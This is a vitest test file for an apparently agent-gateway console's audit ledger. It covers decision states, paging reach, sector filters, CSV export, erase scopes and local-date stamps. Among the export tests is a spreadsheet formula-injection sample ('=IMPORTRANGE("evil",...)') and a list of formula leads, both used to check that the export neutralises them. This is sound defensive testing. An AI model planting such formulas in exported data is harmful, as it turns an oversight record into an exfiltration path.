// Pure-logic tests for the records group — the finding-critical rules stated as functions so they
// are provable without a DOM. Covers #78 (the third decision state), #61's SERVED paging reach and
// sector filter, and the erase scope → body/copy mapping (#74 / the #17 lesson).

// TIMEZONE PIN (mother, 2026-07-25, adversarial-review BLOCKER 2). `ledgerStamp` exists to read the
// LOCAL calendar day; the mutation it guards against is `getMonth()/getDate()` -> the UTC getters. In a
// UTC process the two agree, so the guard cannot fail — and CI is `ubuntu-latest` with no TZ pinned
// anywhere (not this file, not vitest.config.ts, not the workflow). The test was therefore vacuous in
// the ONE environment that gates a merge. Set before any Date is constructed.
process.env.TZ = "America/Los_Angeles";

import { beforeAll, describe, expect, it } from "vitest";
import { AUDIT_LIMIT_DEFAULT, AUDIT_LIMIT_MAX, SECTORS, type AuditRow } from "../../api/types";
import {
  AUDIT_TOOLS,
  DECISION_FILTERS,
  LEDGER_EXPORT_COLUMNS,
  LEDGER_NO_CURSOR_REASON,
  LEDGER_NO_PAGING_REASON,
  LEDGER_PAGE_SIZE,
  SECTOR_FILTERS,
  argsCell,
  argsWithValues,
  auditRowsToCsv,
  decisionFilterParam,
  decisionState,
  formatArgs,
  ledgerExportFilename,
  ledgerExportNote,
  ledgerReach,
  ledgerStamp,
  prettyArgs,
  sectorFilterCaveat,
  sinceParam,
} from "./ledger";
import { ERASE_TOKEN, eraseBodyFrom, eraseConsequence, eraseTargetReady } from "./erase";
import { providerKindLine } from "./settings";

function row(over: Partial<AuditRow>): AuditRow {
  return {
    id: "a1",
    agent_id: "myclaw",
    tool: "query",
    sector: "mail",
    decision: "allow",
    deny_reason: null,
    args: null,
    result_count: null,
    outcome: "ok",
    request_id: "req_1",
    created_at: "2026-07-23T14:22:06.000Z",
    ...over,
  };
}

describe("#78 — decisionState is THREE states, errored ≠ allowed", () => {
  it("a denied call is denied", () => {
    expect(decisionState(row({ decision: "deny", deny_reason: "sector not granted" }))).toBe("denied");
  });

  it("an ALLOWED call whose outcome is error is 'errored', NOT admitted (the whole finding)", () => {
    expect(decisionState(row({ decision: "allow", outcome: "error" }))).toBe("errored");
  });

  it("an allowed call that succeeded is admitted", () => {
    expect(decisionState(row({ decision: "allow", outcome: "ok" }))).toBe("admitted");
    // outcome null (a read that didn't report) is still an admission, not an error.
    expect(decisionState(row({ decision: "allow", outcome: null }))).toBe("admitted");
  });

  it("deny wins even if an outcome happens to be error (denied never got to run)", () => {
    expect(decisionState(row({ decision: "deny", outcome: "error" }))).toBe("denied");
  });
});

describe("#61 — the decision FILTER offers only the served allow/deny (no outcome filter exists)", () => {
  it("the toggle has exactly All · Admitted · Denied — no 'Errored' segment (unbackable)", () => {
    expect(DECISION_FILTERS.map((f) => f.value)).toEqual(["all", "allow", "deny"]);
  });

  it("maps to the served AuditFilters.decision (undefined for All)", () => {
    expect(decisionFilterParam("all")).toBeUndefined();
    expect(decisionFilterParam("allow")).toBe("allow");
    expect(decisionFilterParam("deny")).toBe("deny");
  });
});

// ── #61 part 2 — the reach of a page is a SERVED fact, never counted off the rows ────────────────
//
// This replaces the limit ladder (100 → 250 → 500 → 1,000 → "older cannot be reached from here"). The
// ladder's premise died when the route started minting a keyset cursor: `AUDIT_LIMIT_MAX` now caps ONE
// PAGE and bounds nothing about what is reachable, so raising the limit is no longer how you see older
// entries and there is nothing left to say "unreachable" about.
//
// Every cell below is one of the three traps, each of which this repo has paid for once.

describe("#61 — `hasMore: undefined` is NOT `false` (the trap that would misreport an audit trail)", () => {
  it("no has-more header resolves to 'unknown', never to an end", () => {
    // A gateway older than paging sends neither header. Reporting `end` would tell a person they had
    // reached the end of their own accountability record when NOBODY knows that. The `.not` cell is
    // the one that bites: collapsing undefined into false is a one-character mutation
    // (`page.hasMore === undefined` → `!page.hasMore`) and it typechecks.
    const reach = ledgerReach({ hasMore: undefined, nextCursor: null });
    expect(reach.kind).toBe("unknown");
    expect(reach.kind).not.toBe("end");
    expect(reach).toEqual({ kind: "unknown", reason: LEDGER_NO_PAGING_REASON });
  });

  it("the two are DIFFERENT answers from the same function", () => {
    expect(ledgerReach({ hasMore: undefined, nextCursor: null }).kind).not.toBe(
      ledgerReach({ hasMore: false, nextCursor: null }).kind,
    );
  });

  it("a stray cursor without has-more is still 'unknown' — an uninterpretable marker is not a page", () => {
    // The client already refuses to surface this pairing (`nextCursor` is null unless has-more is
    // true), so this is belt: nothing downstream may resurrect it into a walkable page.
    expect(ledgerReach({ hasMore: undefined, nextCursor: "2026-07-26T10:00:00.123456Z|9" }).kind).toBe(
      "unknown",
    );
  });

  it("the reason is written for the person and says what it does NOT mean", () => {
    // #106: "the published read schema is on the bearer-gated agent mirror" is the anti-pattern. No
    // header name, no route, no version talk — and, load-bearing, it refuses the end-of-history reading
    // out loud rather than leaving the reader to assume it.
    expect(LEDGER_NO_PAGING_REASON).toMatch(/not the same as having reached the end/i);
    expect(LEDGER_NO_PAGING_REASON).not.toMatch(/x-postern|header|\/api\/|cursor|keyset|gateway/i);
  });
});

describe("#61 — an exactly-full FINAL page is an END, because the header says so", () => {
  it("`hasMore: false` is end-of-history whatever the row count was", () => {
    // The route answers from a limit+1 PROBE row — `src/core/query.ts`'s rule that `count === limit` is
    // the wrong signal. `ledgerReach` is not even GIVEN the rows, so the wrong signal is unreachable
    // from here: a page that happens to end on the boundary is the last page, and offering a Load more
    // would return nothing, forever.
    expect(ledgerReach({ hasMore: false, nextCursor: null })).toEqual({ kind: "end" });
  });

  it("and a cursor sent alongside `false` does not reopen the walk", () => {
    expect(ledgerReach({ hasMore: false, nextCursor: "2026-07-26T10:00:00.123456Z|9" }).kind).toBe(
      "end",
    );
  });
});

describe("#61 — a walkable page carries the SERVER's cursor, verbatim", () => {
  it("has-more true + a cursor is 'more', and the cursor is passed through untouched", () => {
    // The microseconds are the whole point: `created_at` on the wire is millisecond-precision, so a
    // cursor rebuilt from a row lands up to 999µs off and silently drops every row inside that window
    // — and the audit writer batch-inserts, so those neighbours are routine. Note the µs digits: no
    // client-side reconstruction could produce this string.
    const CURSOR = "2026-07-26T10:00:00.123456Z|9012";
    expect(ledgerReach({ hasMore: true, nextCursor: CURSOR })).toEqual({
      kind: "more",
      cursor: CURSOR,
    });
  });

  it("has-more true with NO cursor is 'unknown' with its own reason — not a dead Load more", () => {
    // A different fact from "the gate said nothing": here the gate HAS said older entries exist. It
    // must not be reported as an end, and it must not offer a button with nowhere to go.
    const reach = ledgerReach({ hasMore: true, nextCursor: null });
    expect(reach).toEqual({ kind: "unknown", reason: LEDGER_NO_CURSOR_REASON });
    expect(LEDGER_NO_CURSOR_REASON).not.toBe(LEDGER_NO_PAGING_REASON);
  });

  it("one page is the SERVER's own default — the Console invents no page size", () => {
    expect(LEDGER_PAGE_SIZE).toBe(AUDIT_LIMIT_DEFAULT);
    // …and it is a page, not a ceiling on history: the walk is what reaches past it.
    expect(LEDGER_PAGE_SIZE).toBeLessThanOrEqual(AUDIT_LIMIT_MAX);
  });
});

describe("#61 part 1 — the sector filter offers the contract, and admits what it leaves out", () => {
  it("'All sectors' plus the six REGISTRY sectors, empty value = no filter", () => {
    // The vocabulary is the compile-time contract (there is no distinct-sectors route), same posture
    // as AUDIT_TOOLS. The empty first value is what the page drops from `AuditFilters`.
    expect(SECTOR_FILTERS[0]).toEqual({ value: "", label: "All sectors" });
    expect(SECTOR_FILTERS.slice(1).map((o) => o.value)).toEqual([...SECTORS]);
    expect(SECTOR_FILTERS.map((o) => o.label)).toContain("Finance");
  });

  it("choosing a sector says that the gate-wide calls fall out of the view", () => {
    // The route matches `sector = $n` and SQL equality never matches NULL, so `describe_context`,
    // `get_schema` and a refused handshake silently leave a sector-filtered ledger. True, and not
    // guessable from the control — so the one oversight surface says it rather than implying it is
    // showing everything.
    const note = sectorFilterCaveat("finance");
    expect(note).toMatch(/belonged to no sector/i);
    expect(note).toMatch(/still recorded/i);
  });

  it("…and stays silent when no sector is chosen", () => {
    expect(sectorFilterCaveat("")).toBeNull();
  });
});

describe("since presets resolve to a served floor only (no range/before)", () => {
  it("'any' is no floor; a preset is now minus its window", () => {
    const now = new Date("2026-07-23T00:00:00.000Z");
    expect(sinceParam("any", now)).toBeUndefined();
    expect(sinceParam("24h", now)).toBe("2026-07-22T00:00:00.000Z");
    expect(sinceParam("7d", now)).toBe("2026-07-16T00:00:00.000Z");
  });
});

describe("args rendering", () => {
  it("compact for the row, indented for the drill; null → em dash", () => {
    expect(formatArgs(null)).toBe("—");
    expect(prettyArgs(null)).toBe("—");
    expect(formatArgs({ folder: "INBOX", limit: 50 })).toBe('{"folder":"INBOX","limit":50}');
    expect(prettyArgs({ a: 1 })).toBe('{\n  "a": 1\n}');
  });

  // #106 §4 — a Console export's ledger row came back as `{ sector: null }`: a key with nothing in it,
  // beside a Sector column that already said the same thing correctly with an em-dash.
  describe("argsWithValues — the keys that carry a value (#106 §4)", () => {
    it("drops null and undefined keys and keeps the rest", () => {
      expect(argsWithValues({ sector: null, limit: 50 })).toEqual({ limit: 50 });
      expect(argsWithValues({ a: undefined, b: "x" })).toEqual({ b: "x" });
      // A value that is merely FALSY is a value: `0`, `false` and `""` are answers.
      expect(argsWithValues({ limit: 0, all: false, q: "" })).toEqual({ limit: 0, all: false, q: "" });
    });

    it("an object that reduces to nothing is nothing, and so is nothing", () => {
      expect(argsWithValues({ sector: null })).toBeNull();
      expect(argsWithValues({})).toBeNull();
      expect(argsWithValues(null)).toBeNull();
      expect(argsWithValues(undefined)).toBeNull();
    });

    it("a string, an array or a scalar passes through — there is no key to be empty", () => {
      expect(argsWithValues("redacted")).toBe("redacted");
      expect(argsWithValues([1, null])).toEqual([1, null]);
      expect(argsWithValues(7)).toBe(7);
    });

    it("the ledger CELL prints the em-dash the table already uses; the EXPORT keeps the record", () => {
      // The cell: the reader sees the column's own absence mark, not `{"sector":null}`.
      expect(argsCell({ sector: null })).toBe("—");
      expect(argsCell({ sector: null, tool: "query" })).toBe('{"tool":"query"}');
      expect(argsCell(null)).toBe("—");
      expect(formatArgs({ sector: null })).toBe('{"sector":null}');
      // The archive keeps every key the gate recorded, empty ones included — a CSV of the audit trail
      // is evidence, and the screen's readability is not a reason to edit it. Asserted THROUGH
      // `auditRowsToCsv`, because that is the path a mutation would take: pointing `exportCell` at
      // `argsCell` leaves every assertion above green and only this one RED (verified by running it).
      const csv = auditRowsToCsv([row({ agent_id: null, tool: "export", sector: null, args: { sector: null } })]);
      expect(csv).toContain('"{""sector"":null}"');
    });
  });

  it("the tool vocabulary is the seven core primitives", () => {
    expect(AUDIT_TOOLS).toContain("query");
    expect(AUDIT_TOOLS).toContain("invoke_action");
    expect(AUDIT_TOOLS).toContain("fetch_live");
    expect(AUDIT_TOOLS.length).toBe(7);
  });
});

// ── #78 (third sub-finding) — the filtered-view export ────────────────────────────────────────────
//
// The ledger had no export at all: the page carried exactly two controls, the decision chips and Load
// more. `coverage.md` claimed this sub-finding shipped for weeks. These tests assert the CONTENT of
// the file, never that "a download happened" — a cell that only proves a Blob was handed to the
// browser cannot fail for the defect it exists to catch.

describe("#78 — the ledger export is a CSV of exactly the rows it is given", () => {
  const lines = (csv: string) => csv.split("\r\n");

  it("the header is the audit row's own wire field names", () => {
    // Wire names, not display headers: the person opening this file is correlating `request_id` and
    // `created_at` against a log. A rename layer between export and API is a drift surface.
    expect(lines(auditRowsToCsv([]))[0]).toBe(
      '"created_at","agent_id","tool","sector","decision","deny_reason","outcome","result_count","request_id","args","id"',
    );
    expect(LEDGER_EXPORT_COLUMNS).toContain("request_id");
    expect(LEDGER_EXPORT_COLUMNS).toContain("deny_reason");
  });

  it("one row lands in its own columns, `created_at` verbatim and `args` as compact JSON in one cell", () => {
    const csv = auditRowsToCsv([
      row({
        id: "a1",
        agent_id: "myclaw",
        tool: "query",
        sector: "mail",
        decision: "allow",
        outcome: "ok",
        result_count: 12,
        request_id: "req_1",
        args: { folder: "INBOX", limit: 50 },
        created_at: "2026-07-23T14:22:06.000Z",
      }),
    ]);
    // `created_at` is the ISO instant the gate recorded — an archived artefact carries the
    // unambiguous original, not the table's local reading clock.
    expect(lines(csv)[1]).toBe(
      '"2026-07-23T14:22:06.000Z","myclaw","query","mail","allow","","ok","12","req_1","{""folder"":""INBOX"",""limit"":50}","a1"',
    );
  });

  it("the file holds ONLY the rows handed to it — the finding, at the seam", () => {
    // #74's complaint was "Export dumps everything". This function is where that would come back.
    const csv = auditRowsToCsv([row({ request_id: "req_in", id: "in" })]);
    expect(csv).toContain("req_in");
    expect(csv).not.toContain("req_out");
    expect(lines(csv).filter((l) => l.length > 0)).toHaveLength(2); // header + one entry
  });

  it("nulls are empty cells, never the em dash the table draws", () => {
    // "—" is a rendering for a human reading a column. In a data file it is a value that isn't there.
    const csv = auditRowsToCsv([
      row({ agent_id: null, sector: null, deny_reason: null, outcome: null, result_count: null, request_id: null, args: null }),
    ]);
    expect(csv).not.toContain("—");
    expect(lines(csv)[1]).toBe('"2026-07-23T14:22:06.000Z","","query","","allow","","","","","","a1"');
  });

  it("rows are CRLF-delimited and the file ends with a newline (RFC 4180)", () => {
    const csv = auditRowsToCsv([row({}), row({ id: "a2" })]);
    expect(csv.endsWith("\r\n")).toBe(true);
    expect(lines(csv)).toHaveLength(4); // header + 2 entries + the trailing empty
    expect(csv).not.toMatch(/[^\r]\n/); // no bare LF anywhere
  });

  it("a comma, a quote and a newline inside a value cannot break the row apart", () => {
    const csv = auditRowsToCsv([row({ deny_reason: 'mail, not granted — "yet"\nline two' })]);
    // The quote is doubled and the whole field stays inside one quoted cell.
    expect(csv).toContain('"mail, not granted — ""yet""\nline two"');
    // …and the header + one logical row is still all there is.
    expect(csv.split('"2026-07-23')).toHaveLength(2);
  });

  it("a formula-leading value is neutralised — an audit export must not EXECUTE in a spreadsheet", () => {
    // `args` is agent-authored. An agent that writes `=IMPORTRANGE(...)` into a query param would
    // otherwise have it run in the reviewer's spreadsheet the instant they open the trail, turning
    // the oversight surface into an exfiltration path. Quoting alone does NOT prevent this.
    const csv = auditRowsToCsv([row({ args: '=IMPORTRANGE("evil","A1")', deny_reason: "@SUM(A1)" })]);
    expect(csv).toContain('"\'=IMPORTRANGE(""evil"",""A1"")"');
    expect(csv).toContain('"\'@SUM(A1)"');
    // Every one of the leads a spreadsheet acts on, and the tab/CR pair that smuggle them in.
    for (const lead of ["=1+1", "+1+1", "-1+1", "@x", "\tx", "\rx"]) {
      expect(auditRowsToCsv([row({ deny_reason: lead })])).toContain(`"'${lead}"`);
    }
  });

  it("…but a plain number stays a number", () => {
    // Over-eager neutralising would turn every negative figure into text. `result_count` is the
    // column a reviewer sums.
    const csv = auditRowsToCsv([row({ result_count: -50, deny_reason: "-50" })]);
    expect(csv).toContain('"-50"');
    expect(csv).not.toContain("'-50");
  });
});

// The note now derives from the SERVED reach, not from `rows.length === limit`. Two consequences are
// asserted below and both were wrong before: an exactly-full FINAL page used to say "load more first"
// with nothing more to load, and a 1,000-row page used to print a flat dead end that the keyset cursor
// has since made false.
describe("#78/#61 — the export note derives from the served reach and promises nothing else", () => {
  it("reach 'end' is the STRONGEST honest claim — the caveat shrinks to the truth", () => {
    // This is the shrink the pager earns: the walk has been served an end, so the file really is every
    // matching entry. "as of this read" stays, because the audit writer is async by invariant and a call
    // in flight is legitimately not in the file yet.
    const note = ledgerExportNote({ shown: 1043, reach: "end" });
    expect(note).toContain("1,043 entries"); // through `count`, so never "1043"
    expect(note).toContain("every one these filters match");
    expect(note).toContain("as of this read");
    // The retired dead-end sentence must not come back: older entries CAN be reached now.
    expect(note).not.toMatch(/cannot be reached/);
    expect(note).not.toContain("Load more");
  });

  it("reach 'more' points at the pager and claims nothing beyond what is loaded", () => {
    const note = ledgerExportNote({ shown: 100, reach: "more" });
    expect(note).toContain("100 entries");
    expect(note).toContain("nothing beyond what is loaded");
    expect(note).toContain("Load more");
    // It must NOT claim the filters' whole match — older matching rows exist and are not in the file.
    expect(note).not.toContain("every one these filters match");
  });

  it("reach 'unknown' claims NEITHER completeness nor more — the gate did not say", () => {
    // The `undefined` half of the trap, at the export seam: a file that claimed to be "every one these
    // filters match" here would be an audit artefact asserting something no one knows.
    const note = ledgerExportNote({ shown: 100, reach: "unknown" });
    expect(note).toContain("100 entries");
    expect(note).toMatch(/did not say whether anything older exists/);
    expect(note).toMatch(/cannot claim to be all of them/);
    expect(note).not.toContain("every one these filters match");
    expect(note).not.toContain("Load more");
  });

  it("an exactly-full page that is the END no longer tells you to load more", () => {
    // The old note was computed from `shown === limit`, so 100-of-100-and-done printed "Load more first
    // to take more of the trail with you" — advice for a button that would return nothing.
    const note = ledgerExportNote({ shown: AUDIT_LIMIT_DEFAULT, reach: "end" });
    expect(note).not.toContain("Load more");
    expect(note).toContain("every one these filters match");
  });

  it("one entry is one entry (#92 — the 'feeds 1 banks' rule)", () => {
    expect(ledgerExportNote({ shown: 1, reach: "end" })).toContain("1 entry,");
    expect(ledgerExportNote({ shown: 2, reach: "end" })).toContain("2 entries,");
  });
});

describe("#78 — the export filename mirrors the bundle download's convention", () => {
  it("postern-ledger-<date>.csv, beside postern-export-<date>.json", () => {
    expect(ledgerExportFilename(new Date("2026-07-26T21:04:00.000Z"))).toBe(
      "postern-ledger-2026-07-26.csv",
    );
  });
});

describe("#74 — erase scope → body always carries the typed guard, only the scope's own target", () => {
  it("connection scope sends connectionId (never sector)", () => {
    const b = eraseBodyFrom("connection", { connectionId: "conn_1", sector: "mail" });
    expect(b).toEqual({ scope: "connection", confirm: "ERASE", connectionId: "conn_1" });
    expect(b.sector).toBeUndefined();
  });

  it("sector scope sends sector (never connectionId)", () => {
    const b = eraseBodyFrom("sector", { connectionId: "conn_1", sector: "finance" });
    expect(b).toEqual({ scope: "sector", confirm: "ERASE", sector: "finance" });
  });

  it("all scope sends neither target", () => {
    expect(eraseBodyFrom("all", {})).toEqual({ scope: "all", confirm: "ERASE" });
  });

  it("the confirm token is the literal fat-finger guard", () => {
    expect(ERASE_TOKEN).toBe("ERASE");
  });
});

describe("#74 — a scope is not ready until its target is chosen", () => {
  it("connection/sector need a target; all is always ready", () => {
    expect(eraseTargetReady("connection", {})).toBe(false);
    expect(eraseTargetReady("connection", { connectionId: "c" })).toBe(true);
    expect(eraseTargetReady("sector", {})).toBe(false);
    expect(eraseTargetReady("sector", { sector: "mail" })).toBe(true);
    expect(eraseTargetReady("all", {})).toBe(true);
  });
});

describe("erase consequence copy states the real blast radius and that erase ≠ disconnect", () => {
  it("all names identity+keys survive but data is gone", () => {
    const c = eraseConsequence("all");
    expect(c.verb).toBe("Erase everything");
    expect(c.title).toContain("every sector and every connection");
    expect(c.blast).toMatch(/keeps its identity and your agent keys/);
    expect(c.blast).toMatch(/no undo/);
  });

  it("sector/connection say the connection stays connected and re-sync repopulates", () => {
    expect(eraseConsequence("sector", { sectorLabel: "Finance" }).blast).toMatch(/stay connected/);
    expect(eraseConsequence("connection", { connectionLabel: "Chase" }).blast).toMatch(/stays connected/);
    expect(eraseConsequence("sector", { sectorLabel: "Finance" }).title).toContain("Finance");
  });
});

describe("provider kind lines are provider-model facts (Plaid carries the served env)", () => {
  it("fixed lines for the OAuth providers; Plaid folds in env", () => {
    expect(providerKindLine("microsoft")).toBe("public client · PKCE · no secret");
    expect(providerKindLine("google")).toBe("confidential · client id + secret");
    expect(providerKindLine("whoop")).toBe("confidential · offline scope");
    expect(providerKindLine("plaid", "sandbox")).toBe("sandbox · client id + secret");
    expect(providerKindLine("plaid")).toBe("production · client id + secret");
  });
});

// ── #100 item 9 — the ledger's Time column had no date ─────────────────────────
//
// The column rendered the clock only, so on a trail spanning more than one day a row's date was
// recoverable only from the drill — on the one surface you read to find out WHEN something came
// through the gate. Both halves must come from ONE Date and use LOCAL getters: the inspector's
// `formatStamp` renders UTC, and a UTC calendar day beside a local clock in one cell is a real,
// silent, off-by-one-day bug for every user west of UTC.

describe("ledgerStamp — a local calendar day beside the clock (#100 item 9)", () => {
  // The pin above is load-bearing, so prove it took effect rather than trusting it. If a future
  // runner ignores process.env.TZ, this fails LOUDLY here instead of silently making every
  // local-vs-UTC assertion below unfalsifiable — which is the exact failure being fixed.
  beforeAll(() => {
    const probe = new Date(2026, 6, 23, 23, 59, 0);
    expect(probe.getTimezoneOffset()).not.toBe(0);
    // Local and UTC must actually DISAGREE on the calendar day for these assertions to catch anything.
    expect(probe.getDate()).not.toBe(probe.getUTCDate());
  });

  it("a ledger stamp carries the local calendar day, not just the clock", () => {
    // Built from the LOCAL Date constructor, in a deliberately non-UTC zone (see the pin at the top of
    // this file): 23:59 local on 07-23 is 06:59 UTC on 07-24, so a UTC-getter implementation renders
    // "07-24" here and the assertion bites.
    expect(ledgerStamp(new Date(2026, 6, 23, 23, 59, 0).toISOString()).date).toBe("07-23");
    expect(ledgerStamp(new Date(2026, 6, 24, 0, 1, 0).toISOString()).date).toBe("07-24");
    // A single-digit month and day are zero-padded, so the column stays a fixed width.
    expect(ledgerStamp(new Date(2026, 0, 5, 12, 0, 0).toISOString()).date).toBe("01-05");
  });

  it("two entries minutes apart share a day; entries a day apart do not", () => {
    const a = new Date(2026, 6, 23, 10, 0, 0);
    const twoMinutes = new Date(a.getTime() + 2 * 60_000);
    const thirtyHours = new Date(a.getTime() + 30 * 3_600_000);
    expect(ledgerStamp(twoMinutes.toISOString()).date).toBe(ledgerStamp(a.toISOString()).date);
    expect(ledgerStamp(thirtyHours.toISOString()).date).not.toBe(ledgerStamp(a.toISOString()).date);
  });

  it("the clock half is unchanged from what the ledger shipped", () => {
    const iso = new Date(2026, 6, 23, 14, 22, 6).toISOString();
    const { time } = ledgerStamp(iso);
    expect(time).toMatch(/^\d{2}:\d{2}:\d{2}$/);
    expect(time).toBe(new Date(iso).toLocaleTimeString(undefined, { hour12: false }));
  });

  it("an unparseable stamp degrades to the raw value, never to a wrong date", () => {
    // "NaN-NaN" on screen is the failure mode this replaces.
    expect(ledgerStamp("not-a-date")).toEqual({ date: "", time: "not-a-date" });
    expect(ledgerStamp("")).toEqual({ date: "", time: "" });
  });
});
